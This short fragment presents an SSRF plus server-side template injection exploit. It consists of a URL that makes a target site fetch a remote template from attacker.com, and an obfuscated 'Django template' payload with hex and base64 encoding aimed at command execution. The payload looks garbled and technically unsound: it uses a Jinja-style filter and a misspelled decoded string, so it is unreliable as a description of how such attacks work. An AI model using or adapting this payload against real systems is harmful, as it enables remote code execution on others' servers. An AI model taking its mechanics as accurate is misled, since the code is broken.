**Exploit (SSRF + Template Injection):**
# Exploit URL: http://target.com/view?template=http://attacker.com/shell.html
# shell.html content (Django Template):
{{ ''|attr:"\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65"|attr:"a:base64:RVZBTDpzdHJpcHQoJXtjbWQpfSk="|safe }}
